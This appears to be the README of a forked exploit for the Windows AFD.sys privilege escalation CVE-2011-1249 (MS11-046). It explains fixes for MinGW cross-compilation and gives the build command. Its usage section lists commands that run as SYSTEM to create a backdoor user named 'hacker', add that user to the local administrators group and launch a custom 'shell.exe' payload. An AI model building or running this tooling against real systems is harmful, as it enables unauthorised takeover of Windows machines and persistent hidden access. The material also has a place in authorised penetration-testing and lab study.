# ms11-046-mingw

CVE-2011-1249 / MS11-046 — AFD.sys privilege escalation for Windows x86.

Original exploit by Tomislav Paskalev (EDB-40564). This fork fixes MinGW
cross-compilation errors and adds custom command execution via argv[1].

---

## Changes from the original

| # | Change | Why |
|---|--------|-----|
| 1 | `FARPROC ZwQuerySystemInformation` → typed function pointer (`pZwQuerySystemInformation`) | MinGW strict type checking rejects calling a zero-parameter `FARPROC` with arguments — compilation fails with *too many arguments to function* |
| 2 | `securityPatches[]` arrays marked `static` | Arrays declared inside `if/else` blocks are stack-allocated and go out of scope; without `static` the pointers dangle |
| 3 | Custom command via `argv[1]` | Run any command as SYSTEM instead of the hardcoded `cmd.exe` |

---

## Problem

Compiling the original with MinGW fails:

```
ms11-046.c: error: too many arguments to function 'ZwQuerySystemInformation'; expected 0, have 4
```

`FARPROC` is a generic function pointer declared with zero parameters. MinGW enforces strict
type checking and rejects calling it with arguments. The fix is a typed function pointer
with the correct signature.

Pre-compiled binaries exist (e.g. [SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)) but do not support
custom commands.

---

## Cross-compile on Linux (MinGW)

```bash
sudo apt install mingw-w64
i686-w64-mingw32-gcc ms11-046.c -o ms11-046.exe -lws2_32
```

---

## Usage

```
ms11-046.exe                                             # default: spawns cmd.exe as SYSTEM
ms11-046.exe "net user hacker Pass123! /add"             # add a user as SYSTEM
ms11-046.exe "net localgroup administrators hacker /add" # add to local admins
ms11-046.exe "c:\windows\temp\shell.exe"                 # run a custom payload as SYSTEM
```

---

## References

- [MS11-046](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046) — Microsoft Security Bulletin
- [CVE-2011-1249](https://nvd.nist.gov/vuln/detail/CVE-2011-1249) - National Vulnerability Database
- [EDB-40564](https://www.exploit-db.com/exploits/40564) — original exploit
